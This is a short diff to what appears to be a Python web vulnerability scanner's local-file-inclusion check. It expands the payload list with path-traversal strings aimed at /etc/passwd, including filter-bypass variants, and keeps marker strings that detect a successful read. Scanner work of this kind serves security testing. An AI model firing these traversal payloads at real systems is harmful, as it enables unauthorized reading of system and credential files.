@@ -5,7 +5,7 @@ import requests
 
 
 class LFI:
-    payloads = ["showimage.php", "../../../../../../../etc/passwd"]
+    payloads = ["../../../../../../../etc/passwd", "....//....//....//etc/passwd","....\/....\/....\/etc/passwd", "showimage.php", ]
     high_strings = ["root:x:0", "root:x:0", "<?php"]
     LFI_Vulns = []
 
